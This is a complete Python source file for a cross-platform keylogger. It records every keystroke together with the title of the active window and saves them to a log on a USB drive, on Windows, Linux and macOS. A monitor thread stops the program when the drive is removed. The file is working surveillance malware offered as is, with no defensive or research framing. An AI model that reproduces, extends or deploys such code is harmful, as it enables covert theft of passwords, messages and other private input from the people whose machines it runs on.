import logging
from pynput import keyboard
import platform
import os
import time
import threading

# Cross-platform settings for log file location
def get_log_file_path():
    os_name = platform.system()
    if os_name == "Windows":
        # Use USB root directory for Windows
        return os.path.join(os.getcwd(), "key_log.txt")
    elif os_name == "Linux":
        # Use mounted USB location for Linux
        return "/media/username/USB_NAME/key_log.txt"
    elif os_name == "Darwin":  # macOS
        # Use mounted USB location for macOS
        return "/Volumes/USB_NAME/key_log.txt"
    else:
        raise Exception("Unsupported Operating System")

# Set up logging
log_file = get_log_file_path()
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Function to get active window title
def get_active_window():
    try:
        os_name = platform.system()
        if os_name == "Windows":
            import win32gui
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        elif os_name == "Linux":
            from Xlib import display
            d = display.Display()
            window = d.get_input_focus().focus
            return window.get_wm_name() if window else "Unknown Window"
        elif os_name == "Darwin":  # macOS
            from AppKit import NSWorkspace
            active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
            return active_app.localizedName()
        else:
            return "Unsupported OS"
    except Exception as e:
        return f"Error capturing window title: {e}"

# Keylogger functions
def on_press(key):
    active_window = get_active_window()  # Get the active window title
    try:
        logging.info(f"[{active_window}] Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"[{active_window}] Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop keylogger when 'Esc' is pressed
        return False

# USB Detection (Linux and macOS only)
def monitor_usb_removal():
    while True:
        if not os.path.exists(log_file):
            print("USB removed. Stopping keylogger.")
            os._exit(0)  # Stop the program
        time.sleep(5)

# Main keylogger function
def start_keylogger():
    # Start USB monitoring in a separate thread
    usb_thread = threading.Thread(target=monitor_usb_removal)
    usb_thread.daemon = True
    usb_thread.start()

    # Start listening for key presses
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Entry point
if __name__ == "__main__":
    try:
        print(f"Starting keylogger. Logs will be saved to: {log_file}")
        start_keylogger()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
